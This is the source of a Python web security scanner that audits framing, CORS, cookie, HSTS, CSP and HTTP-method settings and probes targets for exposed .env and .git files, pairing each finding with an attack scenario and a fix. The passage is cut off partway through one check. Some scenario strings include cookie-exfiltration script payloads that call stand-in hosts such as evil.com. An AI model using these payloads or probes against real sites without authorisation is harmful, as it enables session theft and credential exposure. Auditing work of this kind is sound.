# Author: AVII-VERSE
# CJF - Clickjacking Finder & Web Security Scanner v1.0
# High-Performance Multi-Threaded Vulnerability Auditor & Attack Demonstrator

import os
import sys
import ssl
import socket
import json
import re
import webbrowser
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from sys import argv, exit

if os.name == 'nt':
    os.system('')

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

__author__  = 'AVII-VERSE'
__version__ = '1.0'

# ── ANSI COLORS ─────────────────────────────────────
C   = '\033[96m'   # Cyan
G   = '\033[92m'   # Green
Y   = '\033[93m'   # Yellow
R   = '\033[91m'   # Red
M   = '\033[95m'   # Magenta
B   = '\033[94m'   # Blue
W   = '\033[97m'   # Bright White
BO  = '\033[1m'    # Bold
DM  = '\033[2m'    # Dim
RS  = '\033[0m'    # Reset

RISK_C = {'CRITICAL': R, 'HIGH': R, 'MEDIUM': Y, 'LOW': C, 'INFO': B}
RISK_S = {'CRITICAL': 5, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1, 'INFO': 0}

def strip_ansi(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', str(s))

def print_cyber_box(title, lines, width=68, color=M):
    top = f"{color}+" + ("=" * (width - 2)) + f"+{RS}"
    bot = f"{color}+" + ("=" * (width - 2)) + f"+{RS}"
    print(top)
    if title:
        vis_t = len(strip_ansi(title))
        pad_t = width - 4 - vis_t
        print(f"{color}|{RS}  {title}" + (" " * max(0, pad_t)) + f"{color}|{RS}")
        print(f"{color}+" + ("-" * (width - 2)) + f"+{RS}")
    for l in lines:
        vis = len(strip_ansi(l))
        pad = width - 4 - vis
        print(f"{color}|{RS}  {l}" + (" " * max(0, pad)) + f"{color}|{RS}")
    print(bot)

THREADS = 5
TIMEOUT = 8
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 CJF/1.0'

# ═══════════════════════════════════════════════════
#  SECURITY AUDIT FUNCTIONS
# ═══════════════════════════════════════════════════

def get_target_ip(host):
    try:
        return socket.gethostbyname(host)
    except Exception:
        return "Unknown"

def chk_clickjacking(hdrs, full_url):
    xfo = hdrs.get('X-Frame-Options')
    csp = hdrs.get('Content-Security-Policy', '')
    fa  = 'frame-ancestors' in csp.lower() if csp else False
    if xfo is None and not fa:
        return {
            'id':              'CLICKJACKING',
            'risk':            'HIGH',
            'name':            'Clickjacking (Missing Framing Protections)',
            'location':        'HTTP Response Headers -> X-Frame-Options & Content-Security-Policy',
            'code_file':       'nginx.conf (server block) OR Express.js (helmet.frameguard) OR Django (MIDDLEWARE)',
            'evidence':        'X-Frame-Options: NOT PRESENT | CSP frame-ancestors: NOT SET',
            'root':            'The server omits framing protection directives. Web browsers allow any external domain to render this webpage inside an <iframe> context.',
            'impact':          'Attackers can embed this application transparently beneath a decoy user interface on an external website, coercing victims into unknowingly executing state-changing operations (account modification, transaction authorization, data deletion).',
            'attack_scenario': '1. Threat actor builds a malicious site (e.g., claiming a free gift).\n2. Target application is loaded in a transparent <iframe> layered directly over the decoy button.\n3. Victim clicks the visible "Claim Prize" button, but the click passes through into the underlying target site button (e.g., "Confirm Transfer" or "Delete Account").\n4. Target server processes the authenticated request from the victim\'s active session.',
            'vuln_code':       "// Express.js without security headers\nconst express = require('express');\nconst app = express();\n// No frameguard or CSP frame-ancestors configured\napp.get('/', (req, res) => res.render('dashboard'));",
            'secure_code':     "# Nginx Configuration:\nadd_header Content-Security-Policy \"frame-ancestors 'none';\" always;\nadd_header X-Frame-Options \"DENY\" always;\n\n// Express.js with Helmet:\nconst helmet = require('helmet');\napp.use(helmet.frameguard({ action: 'deny' }));",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | Score: 6.1',
            'fix':             "Add the following header to server configuration:\n"
                               "Nginx:   add_header Content-Security-Policy \"frame-ancestors 'none';\" always;\n"
                               "Apache:  Header always set Content-Security-Policy \"frame-ancestors 'none';\"\n"
                               "Express: app.use(helmet.frameguard({ action: 'deny' }));",
            'ref':             'https://owasp.org/www-community/attacks/Clickjacking',
            'poc':             True,
            'demo_type':       'clickjacking'
        }
    return None

def chk_cors_wildcard(hdrs):
    acao = hdrs.get('Access-Control-Allow-Origin', '')
    acac = hdrs.get('Access-Control-Allow-Credentials', '')
    if acao == '*':
        sev = 'HIGH' if 'true' in acac.lower() else 'MEDIUM'
        return {
            'id':              'CORS_WILDCARD',
            'risk':            sev,
            'name':            'Insecure CORS Wildcard Header',
            'location':        'HTTP Response Headers -> Access-Control-Allow-Origin',
            'code_file':       'Backend API Route Handler (server.js / app.py / api_gateway.conf)',
            'evidence':        f'Access-Control-Allow-Origin: * | Access-Control-Allow-Credentials: {acac or "Not Set"}',
            'root':            'The web application implements a blanket wildcard (*) Access-Control-Allow-Origin header instead of validating requested origins.',
            'impact':          'Arbitrary external websites can initiate cross-origin fetch/XHR calls and read sensitive API response payloads.',
            'attack_scenario': '1. Authenticated user visits attacker.com.\n2. Attacker script issues fetch("https://target.com/api/user-data").\n3. Because ACAO is *, the browser allows attacker script to read the full JSON response containing private records.\n4. Attacker exfiltrates the records to their command server.',
            'vuln_code':       "// Insecure Wildcard Configuration:\napp.use(cors({ origin: '*' }));\n// Or manual response header:\nres.setHeader('Access-Control-Allow-Origin', '*');",
            'secure_code':     "// Secure Whitelist Validation:\nconst whitelist = ['https://app.target.com'];\napp.use(cors({\n  origin: (origin, cb) => {\n    if (!origin || whitelist.includes(origin)) cb(null, true);\n    else cb(new Error('Blocked by CORS'));\n  },\n  credentials: true\n}));",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N | Score: 7.2',
            'fix':             "Remove the wildcard origin. Validate origin headers against a strict server-side whitelist:\n"
                               "Nginx:   if ($http_origin ~* (https://trusted\\.domain\\.com)) { add_header Access-Control-Allow-Origin $http_origin; }\n"
                               "Express: app.use(cors({ origin: ['https://trusted.domain.com'], credentials: true }));",
            'ref':             'https://portswigger.net/web-security/cors',
            'poc':             False,
            'demo_type':       'cors'
        }
    return None

def chk_cors_reflection(base_url):
    try:
        test_origin = 'https://attacker-controlled-context.com'
        req = Request(base_url, headers={'User-Agent': UA, 'Origin': test_origin})
        resp = urlopen(req, timeout=TIMEOUT)
        acao = resp.info().get('Access-Control-Allow-Origin', '')
        acac = resp.info().get('Access-Control-Allow-Credentials', '')
        if test_origin in acao:
            sev = 'CRITICAL' if 'true' in acac.lower() else 'HIGH'
            return {
                'id':              'CORS_REFLECT',
                'risk':            sev,
                'name':            'Arbitrary CORS Origin Reflection (SOP Bypass)',
                'location':        'Server Origin Dispatcher -> Access-Control-Allow-Origin',
                'code_file':       'Backend CORS Middleware (middleware/cors.js or django_cors_headers)',
                'evidence':        f'Sent Origin: {test_origin} | Reflected ACAO: {acao} | Allow-Credentials: {acac or "false"}',
                'root':            'The server dynamically mirrors the incoming request Origin header directly into Access-Control-Allow-Origin without whitelist validation.',
                'impact':          'Enables complete Same-Origin Policy (SOP) bypass. A malicious domain visited by an authenticated user can read sensitive session data, profile details, and API responses.',
                'attack_scenario': '1. Victim logs into target.com.\n2. In another tab, victim visits attacker.com.\n3. Attacker page executes: fetch("https://target.com/api/account", {credentials: "include"}).\n4. Target server reflects Origin: attacker.com with Access-Control-Allow-Credentials: true.\n5. Browser hands private user account JSON directly to attacker JavaScript.',
                'vuln_code':       "// Insecure Origin Reflection:\napp.use((req, res, next) => {\n  res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // Blind reflection!\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n  next();\n});",
                'secure_code':     "// Secure Validation with Strict Whitelist:\nconst allowed = new Set(['https://portal.target.com']);\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (allowed.has(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n    res.setHeader('Access-Control-Allow-Credentials', 'true');\n  }\n  next();\n});",
                'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N | Score: 9.3',
                'fix':             "Never reflect arbitrary request Origin headers. Enforce an immutable whitelist:\n"
                                   "Nginx:   map $http_origin $cors_allowed { default \"\"; \"https://trusted.com\" \"$http_origin\"; }\n"
                                   "Node.js: cors({ origin: function(origin, callback) { if(whitelist.indexOf(origin) !== -1) callback(null, true); } })",
                'ref':             'https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack',
                'poc':             False,
                'demo_type':       'cors'
            }
    except Exception:
        pass
    return None

def chk_cookies(hdrs):
    raw = hdrs.get_all('Set-Cookie') if hasattr(hdrs, 'get_all') else [hdrs.get('Set-Cookie')]
    if not raw or raw == [None]:
        return None
    issues = []
    for ck in raw:
        if not ck: continue
        ck_lower = ck.lower()
        cookie_name = ck.split('=')[0].strip()
        if 'secure' not in ck_lower:
            issues.append(f"'{cookie_name}' missing Secure flag (transmitted over cleartext HTTP)")
        if 'httponly' not in ck_lower:
            issues.append(f"'{cookie_name}' missing HttpOnly flag (accessible via document.cookie XSS)")
        if 'samesite' not in ck_lower:
            issues.append(f"'{cookie_name}' missing SameSite flag (susceptible to CSRF vectors)")
    if issues:
        return {
            'id':              'INSECURE_COOKIE',
            'risk':            'HIGH',
            'name':            'Insecure Cookie Attributes Missing (XSS/CSRF Risk)',
            'location':        'HTTP Response Headers -> Set-Cookie',
            'code_file':       'Authentication Controller / Session Middleware (controllers/auth.js / settings.py)',
            'evidence':        ' | '.join(issues[:3]),
            'root':            'Session tokens or persistent application state cookies are instantiated without defensive security attributes (Secure, HttpOnly, SameSite).',
            'impact':          'Missing HttpOnly permits script-driven cookie theft during Cross-Site Scripting (XSS). Missing Secure permits cookie interception over cleartext networks. Missing SameSite facilitates Cross-Site Request Forgery (CSRF).',
            'attack_scenario': '1. If HttpOnly is missing: An XSS flaw allows injected JavaScript to execute `var stolen = document.cookie; fetch("https://attacker.com/log?"+stolen);`.\n2. If Secure is missing: An adversary on unencrypted Wi-Fi sniffs the cleartext HTTP cookie.\n3. If SameSite is missing: A malicious page triggers background state-changing POST requests carrying the victim\'s session cookie automatically.',
            'vuln_code':       "// Insecure Cookie Setter:\nres.cookie('auth_token', sessionJwt);\n// Or raw header:\nSet-Cookie: auth_token=xyz123; Path=/",
            'secure_code':     "// Secure Cookie Setter:\nres.cookie('auth_token', sessionJwt, {\n  secure: true,        // HTTPS only\n  httpOnly: true,      // Blocks document.cookie JavaScript access\n  sameSite: 'strict',  // Blocks cross-site CSRF requests\n  path: '/'\n});",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N | Score: 7.1',
            'fix':             "Configure all authentication and session cookies with security flags:\n"
                               "Set-Cookie: session_id=<token>; Secure; HttpOnly; SameSite=Strict; Path=/;\n"
                               "Express: res.cookie('session', token, { secure: true, httpOnly: true, sameSite: 'strict' });",
            'ref':             'https://owasp.org/www-community/controls/SecureCookieAttribute',
            'poc':             False,
            'demo_type':       'cookie'
        }
    return None

def chk_hsts(hdrs, url):
    hsts = hdrs.get('Strict-Transport-Security')
    if url.startswith('https://') and hsts is None:
        return {
            'id':              'MISSING_HSTS',
            'risk':            'HIGH',
            'name':            'Missing HTTP Strict Transport Security (HSTS)',
            'location':        'HTTP Response Headers -> Strict-Transport-Security',
            'code_file':       'Web Server SSL Termination (nginx.conf / ssl.conf / Caddyfile)',
            'evidence':        'Strict-Transport-Security: NOT PRESENT on HTTPS endpoint',
            'root':            'The server serves content securely via HTTPS but does not mandate modern browsers to strictly enforce HTTPS connections on future requests.',
            'impact':          'Leaves end users susceptible to SSL Stripping and active Man-in-the-Middle (MITM) downgrade attacks over unsecured public networks.',
            'attack_scenario': '1. Victim connects to public airport Wi-Fi and types http://target.com.\n2. Attacker runs sslstrip / arpspoof to intercept the unencrypted HTTP request.\n3. Attacker establishes HTTPS with real server, but serves plain HTTP back to the victim.\n4. All submitted credentials, tokens, and personal records flow in cleartext through the attacker.',
            'vuln_code':       "# Nginx SSL Server Block missing HSTS:\nserver {\n  listen 443 ssl;\n  server_name target.com;\n  # Missing add_header Strict-Transport-Security\n}",
            'secure_code':     "# Nginx SSL Server Block with HSTS:\nserver {\n  listen 443 ssl;\n  server_name target.com;\n  add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n}",
            'cvss':            'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N | Score: 6.8',
            'fix':             "Enable HSTS with a minimum max-age duration of one year (31536000 seconds):\n"
                               "Nginx:   add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n"
                               "Apache:  Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"",
            'ref':             'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security',
            'poc':             False,
            'demo_type':       'hsts'
        }
    elif hsts:
        try:
            parts = [p.strip().lower() for p in hsts.split(';')]
            max_age_part = [p for p in parts if p.startswith('max-age=')]
            if max_age_part:
                age = int(max_age_part[0].split('=')[1])
                if age < 15552000:
                    return {
                        'id':              'WEAK_HSTS',
                        'risk':            'MEDIUM',
                        'name':            'Weak HSTS max-age Duration (< 180 Days)',
                        'location':        'HTTP Response Headers -> Strict-Transport-Security',
                        'code_file':       'Web Server SSL Termination (nginx.conf / ssl.conf)',
                        'evidence':        f'Strict-Transport-Security: {hsts} (max-age is {age}s, recommended >= 31536000s)',
                        'root':            'The configured max-age parameter is too short to provide persistent HTTPS enforcement.',
                        'impact':          'Reduces protection window against protocol downgrade and SSL stripping attacks.',
                        'attack_scenario': 'Once the short max-age expires, user browsers revert to plain HTTP lookups on initial navigation, opening an intercept window for MITM attackers.',
                        'vuln_code':       "add_header Strict-Transport-Security \"max-age=86400\"; # Only 1 day!",
                        'secure_code':     "add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;",
                        'cvss':            'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N | Score: 4.2',
                        'fix':             'Increase HSTS duration to at least 31536000 seconds (1 year) and includeSubDomains.',
                        'ref':             'https://hstspreload.org/',
                        'poc':             False,
                        'demo_type':       'hsts'
                    }
        except Exception:
            pass
    return None

def chk_csp(hdrs):
    csp = hdrs.get('Content-Security-Policy')
    if csp is None:
        return {
            'id':              'MISSING_CSP',
            'risk':            'HIGH',
            'name':            'Missing Content Security Policy (XSS Defense Absent)',
            'location':        'HTTP Response Headers -> Content-Security-Policy',
            'code_file':       'Web Server Security Configuration / index.html meta headers',
            'evidence':        'Content-Security-Policy: NOT PRESENT',
            'root':            'The web server does not deliver a Content Security Policy header to restrict executable resource sources.',
            'impact':          'Eliminates second-line browser defenses against Cross-Site Scripting (XSS), malicious script injection, and clickjacking attacks.',
            'attack_scenario': '1. Threat actor finds an unescaped input parameter (search box, profile bio, comment).\n2. Injects an inline payload: `<script>fetch("https://evil.com/leak?"+document.cookie)</script>`.\n3. Because no CSP restricts script execution, the browser executes the script immediately upon render.',
            'vuln_code':       "<!-- Missing Content-Security-Policy -->\n<head>\n  <title>Application</title>\n  <!-- Any injected inline script will execute freely! -->\n</head>",
            'secure_code':     "# Nginx Strict CSP Header:\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';\" always;",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N | Score: 8.8',
            'fix':             "Deploy a restrictive CSP header specifying trusted origins:\n"
                               "Nginx: add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\" always;\n"
                               "Apache: Header always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\"",
            'ref':             'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP',
            'poc':             False,
            'demo_type':       'csp'
        }
    issues = []
    csp_l = csp.lower()
    if "'unsafe-inline'" in csp_l:
        issues.append("'unsafe-inline' directive permits arbitrary inline JavaScript execution")
    if "'unsafe-eval'" in csp_l:
        issues.append("'unsafe-eval' directive permits dynamic string-to-code execution")
    if 'data:' in csp_l:
        issues.append("'data:' URI scheme allows arbitrary base64 payload injection")
    if issues:
        return {
            'id':              'WEAK_CSP',
            'risk':            'MEDIUM',
            'name':            'Permissive Content Security Policy Directives',
            'location':        'HTTP Response Headers -> Content-Security-Policy',
            'code_file':       'Server Configuration / Web Application Helmet Config',
            'evidence':        ' | '.join(issues),
            'root':            f'Configured CSP contains insecure exceptions allowing unverified code execution: {csp[:90]}...',
            'impact':          'Allows script injection payloads to bypass CSP filters if an injection point exists in the application.',
            'attack_scenario': 'An attacker who discovers an HTML injection vector can bypass this CSP because `unsafe-inline` or `unsafe-eval` instructs the browser to execute user-injected code anyway.',
            'vuln_code':       "// Insecure Permissive CSP Directive:\nadd_header Content-Security-Policy \"default-src * 'unsafe-inline' 'unsafe-eval';\";",
            'secure_code':     "// Secure Nonce-Based CSP Directive:\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none';\";",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:M/I:M/A:N | Score: 6.1',
            'fix':             "Remove 'unsafe-inline' and 'unsafe-eval'. Migrate to cryptographic nonces or hashes (e.g., 'nonce-random123').",
            'ref':             'https://csp-evaluator.withgoogle.com/',
            'poc':             False,
            'demo_type':       'csp'
        }
    return None

def chk_http_methods(base_url):
    try:
        req = Request(base_url, headers={'User-Agent': UA}, method='OPTIONS')
        resp = urlopen(req, timeout=TIMEOUT)
        allow = resp.info().get('Allow', '') or resp.info().get('Public', '')
        if allow:
            methods = [m.strip().upper() for m in allow.split(',')]
            dangerous = [m for m in methods if m in ['TRACE', 'TRACK', 'PUT', 'DELETE']]
            if 'TRACE' in dangerous or 'TRACK' in dangerous:
                return {
                    'id':              'HTTP_TRACE',
                    'risk':            'HIGH',
                    'name':            'Cross-Site Tracing (HTTP TRACE Method Enabled)',
                    'location':        f'Web Server Method Dispatcher -> {allow}',
                    'code_file':       'Apache / Nginx Core Configuration (httpd.conf / default.conf)',
                    'evidence':        f'Allow / Public Header: {allow}',
                    'root':            'The web server enables HTTP TRACE / TRACK methods, which reflect request headers back in the response body.',
                    'impact':          'Enables Cross-Site Tracing (XST) attacks. An attacker executing XSS can bypass HttpOnly cookie defenses by issuing a TRACE request and reading the reflected cookie string.',
                    'attack_scenario': '1. An attacker identifies an XSS vector on a site using HttpOnly cookies.\n2. Injects script that sends an XMLHttp/fetch TRACE request to the server.\n3. Server echoes back the full request headers in the response body.\n4. Attacker script reads the reflected HttpOnly cookie directly from the response text, defeating HttpOnly protection.',
                    'vuln_code':       "# Apache with default TRACE enabled:\nTraceEnable on",
                    'secure_code':     "# Apache Hardening:\nTraceEnable off\n\n# Nginx Hardening:\nif ($request_method ~ ^(TRACE|TRACK)$) {\n  return 405;\n}",
                    'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N | Score: 6.5',
                    'fix':             "Disable TRACE and TRACK methods on the web server:\n"
                                       "Apache: TraceEnable off\n"
                                       "Nginx:  if ($request_method ~ ^(TRACE|TRACK)$) { return 405; }",
                    'ref':             'https://owasp.org/www-community/attacks/Cross_Site_Tracing',
                    'poc':             False,
                    'demo_type':       'methods'
                }
            elif dangerous:
                return {
                    'id':              'DANGEROUS_METHODS',
                    'risk':            'MEDIUM',
                    'name':            'Potentially Dangerous HTTP Methods Enabled (PUT/DELETE)',
                    'location':        f'Web Server Method Dispatcher -> {allow}',
                    'code_file':       'Web Server API Gateway / Router Configuration',
                    'evidence':        f'Enabled Methods: {", ".join(dangerous)}',
                    'root':            'The web server allows state-modifying HTTP verbs (PUT, DELETE) on root endpoints.',
                    'impact':          'If permissions or authentication barriers fail, unauthorized users might attempt arbitrary resource modification or deletion.',
                    'attack_scenario': 'Unauthenticated clients issue PUT or DELETE calls targeting endpoints that lack granular method-level authorization checks.',
                    'vuln_code':       "# Unrestricted methods in server block:\n<Location />\n  # Allows all methods\n</Location>",
                    'secure_code':     "# Restrict methods in server block:\n<LimitExcept GET POST HEAD>\n  Require all denied\n</LimitExcept>",
                    'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L | Score: 5.3',
                    'fix':             "Restrict HTTP methods to GET, POST, HEAD unless explicitly required:\n"
                                       "Nginx: if ($request_method !~ ^(GET|POST|HEAD)$) { return 405; }",
                    'ref':             'https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods',
                    'poc':             False,
                    'demo_type':       'methods'
                }
    except Exception:
        pass
    return None

def chk_sensitive_files(base_url):
    findings = []
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    
    # 1. Check .env file
    try:
        req = Request(f"{origin}/.env", headers={'User-Agent': UA})
        resp = urlopen(req, timeout=TIMEOUT)
        if resp.status == 200:
            content = resp.read(512).decode('utf-8', errors='ignore')
            if '=' in content and any(k in content.upper() for k in ['DB_', 'SECRET', 'PASSWORD', 'API_KEY', 'APP_KEY']):
                findings.append({
                    'id':              'EXPOSED_ENV',
                    'risk':            'CRITICAL',
                    'name':            'Exposed Environment Configuration File (.env)',
                    'location':        f'{origin}/.env',
                    'code_file':       'Deployment Webroot Directory (/var/www/html/.env or public/.env)',
                    'evidence':        f'HTTP 200 OK | File contains sensitive environment assignments: {content[:80]}...',
                    'root':            'The .env file is stored directly within the public web document root without server-level access restrictions.',
                    'impact':          'Complete infrastructure compromise. Attackers can read database credentials, private API keys, cryptographic secrets, and internal endpoints.',
                    'attack_scenario': '1. Attacker queries https://target.com/.env directly.\n2. Server delivers plaintext database credentials, payment API keys, and JWT private signing keys.\n3. Attacker uses keys to connect to internal databases or forge administrative authentication tokens.',
                    'vuln_code':       "# Deployment mistake: .env copied into public web directory\ncp -r /app/.env /var/www/html/.env",
                    'secure_code':     "# Nginx: Block all dotfiles and environment files:\nlocation ~ /\\.env {\n  deny all;\n  return 404;\n}",
                    'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H | Score: 10.0',
                    'fix':             "Move .env outside public webroot. Deny access via server config:\n"
                                       "Nginx: location ~ /\\.env { deny all; return 404; }\n"
                                       "Apache: <Files \".env\"> Require all denied </Files>",
                    'ref':             'https://cwe.mitre.org/data/definitions/552.html',
                    'poc':             False,
                    'demo_type':       'sensitive_file'
                })
    except Exception:
        pass

    # 2. Check .git/HEAD
    try:
        req = Request(f"{origin}/.git/HEAD", headers={'User-Agent': UA})
        resp = urlopen(req, timeout=TIMEOUT)
        if resp.status == 200:
            content = resp.read(128).decode('utf-8', errors='ignore').strip()
            if content.startswith('ref: refs/') or len(content) == 40:
                findings.append({
                    'id':              'EXPOSED_GIT',
                    'risk':            'CRITICAL',
                    'name':            'Exposed Git Repository Root (.git/HEAD)',
                    'location':        f'{origin}/.git/HEAD',
                    'code_file':       'Production Document Root (/var/www/html/.git)',
                    'evidence':        f'HTTP 200 OK | Content: {content}',
                    'root':            'The .git version control repository was deployed to production and remains accessible over HTTP.',
                    'impact':          'Attackers can extract the entire source code repository, commit history, hardcoded credentials, and architectural secrets using tools like git-dumper.',
                    'attack_scenario': '1. Threat actor confirms .git/HEAD exists.\n2. Runs an automated extractor (git-dumper) to rebuild the entire repository index.\n3. Recovers all source code files, proprietary business logic, commit logs, and hardcoded development passwords.',
                    'vuln_code':       "# Deployment flaw: git clone directly inside public html folder\ncd /var/www/html && git clone https://github.com/org/repo.git .",
                    'secure_code':     "# Nginx: Deny access to .git folders:\nlocation ~ /\\.git {\n  deny all;\n  return 404;\n}",
                    'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | Score: 8.6',
                    'fix':             "Block all requests targeting hidden dotfiles:\n"
                                       "Nginx: location ~ /\\.git { deny all; return 404; }\n"
                                       "Apache: <DirectoryMatch \"/\\.git\"> Require all denied </DirectoryMatch>",
                    'ref':             'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure',
                    'poc':             False,
                    'demo_type':       'sensitive_file'
                })
    except Exception:
        pass

    # 3. Check robots.txt for sensitive endpoints
    try:
        req = Request(f"{origin}/robots.txt", headers={'User-Agent': UA})
        resp = urlopen(req, timeout=TIMEOUT)
        if resp.status == 200:
            txt = resp.read(2048).decode('utf-8', errors='ignore')
            disallowed = []
            for line in txt.splitlines():
                if line.lower().startswith('disallow:'):
                    path = line.split(':', 1)[1].strip()
                    if any(s in path.lower() for s in ['admin', 'api', 'backup', 'secret', 'dashboard', 'internal', 'staging', 'portal']):
                        disallowed.append(path)
            if disallowed:
                findings.append({
                    'id':              'ROBOTS_DISCLOSURE',
                    'risk':            'LOW',
                    'name':            'Sensitive Internal Paths Disclosed in robots.txt',
                    'location':        f'{origin}/robots.txt',
                    'code_file':       'Public Static Asset (public/robots.txt)',
                    'evidence':        f'Disclosed Paths: {", ".join(disallowed[:5])}',
                    'root':            'Web administrators listed private administration or internal API endpoints inside public robots.txt files.',
                    'impact':          'Facilitates target reconnaissance. Attackers identify hidden admin panels, staging servers, and internal entry points without brute-forcing.',
                    'attack_scenario': '1. Attacker reads robots.txt.\n2. Discovers disallowed paths like /admin-secret-panel or /internal-api/v1.\n3. Focuses exploitation directly against these privileged interfaces.',
                    'vuln_code':       "# robots.txt exposing sensitive endpoints:\nUser-agent: *\nDisallow: /admin-internal-portal/\nDisallow: /backup-db/",
                    'secure_code':     "# Secure practice: Protect endpoints with authentication & ACLs, not robots.txt\nUser-agent: *\nDisallow: /",
                    'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | Score: 3.7',
                    'fix':             "Do not rely on robots.txt for security. Protect private endpoints with server-level authentication and network firewall ACLs.",
                    'ref':             'https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt',
                    'poc':             False,
                    'demo_type':       'sensitive_file'
                })
    except Exception:
        pass

    return findings

def chk_mime_sniffing(hdrs):
    xcto = hdrs.get('X-Content-Type-Options', '')
    if 'nosniff' not in xcto.lower():
        return {
            'id':              'MIME_SNIFFING',
            'risk':            'MEDIUM',
            'name':            'Missing X-Content-Type-Options (MIME Sniffing)',
            'location':        'HTTP Response Headers -> X-Content-Type-Options',
            'code_file':       'Web Server Global Response Headers (nginx.conf / express helmet)',
            'evidence':        f'X-Content-Type-Options: {xcto or "NOT PRESENT"}',
            'root':            'The server fails to instruct user agents to honor the declared Content-Type header without sniffing.',
            'impact':          'Permits MIME-confusion attacks. Browsers may execute benign text or user-uploaded media files as HTML/JavaScript if script elements are detected.',
            'attack_scenario': '1. Attacker uploads a profile photo containing embedded HTML and JavaScript.\n2. Server serves the file with image/jpeg or text/plain.\n3. Missing nosniff causes the browser to sniff the payload as text/html and execute malicious scripts.',
            'vuln_code':       "// Server response lacking nosniff:\nres.setHeader('Content-Type', 'text/plain');\n// Missing X-Content-Type-Options",
            'secure_code':     "# Nginx:\nadd_header X-Content-Type-Options \"nosniff\" always;\n\n// Express.js:\napp.use(helmet.noSniff());",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:M/I:M/A:N | Score: 6.1',
            'fix':             "Add nosniff header across all responses:\n"
                               "Nginx:  add_header X-Content-Type-Options \"nosniff\" always;\n"
                               "Apache: Header always set X-Content-Type-Options \"nosniff\"",
            'ref':             'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options',
            'poc':             False,
            'demo_type':       'headers'
        }
    return None

def chk_referrer_policy(hdrs):
    rp = hdrs.get('Referrer-Policy')
    if rp is None:
        return {
            'id':              'MISSING_REFERRER',
            'risk':            'LOW',
            'name':            'Missing Referrer-Policy',
            'location':        'HTTP Response Headers -> Referrer-Policy',
            'code_file':       'Global Server Configuration / index.html',
            'evidence':        'Referrer-Policy: NOT PRESENT',
            'root':            'The application does not declare how much referrer information should be transmitted on outbound requests.',
            'impact':          'Full target URLs (which may contain sensitive query tokens, IDs, or reset keys) may leak to external third-party CDN or analytics servers.',
            'attack_scenario': '1. User receives a password reset link: `https://target.com/reset?token=secret123`.\n2. The page loads an external third-party analytics script or font.\n3. The browser sends the full reset link including `token=secret123` in the HTTP Referer header to the external domain.',
            'vuln_code':       "<!-- Missing Referrer-Policy header/meta -->\n<a href=\"https://external-partner.com\">Partner Link</a>",
            'secure_code':     "# Nginx:\nadd_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n\n<!-- HTML Meta Tag -->\n<meta name=\"referrer\" content=\"strict-origin-when-cross-origin\">",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N | Score: 4.3',
            'fix':             "Enforce strict-origin-when-cross-origin:\n"
                               "Nginx:  add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n"
                               "Apache: Header always set Referrer-Policy \"strict-origin-when-cross-origin\"",
            'ref':             'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy',
            'poc':             False,
            'demo_type':       'headers'
        }
    return None

def chk_permissions_policy(hdrs):
    pp = hdrs.get('Permissions-Policy') or hdrs.get('Feature-Policy')
    if pp is None:
        return {
            'id':              'MISSING_PERMISSIONS',
            'risk':            'LOW',
            'name':            'Missing Permissions-Policy',
            'location':        'HTTP Response Headers -> Permissions-Policy',
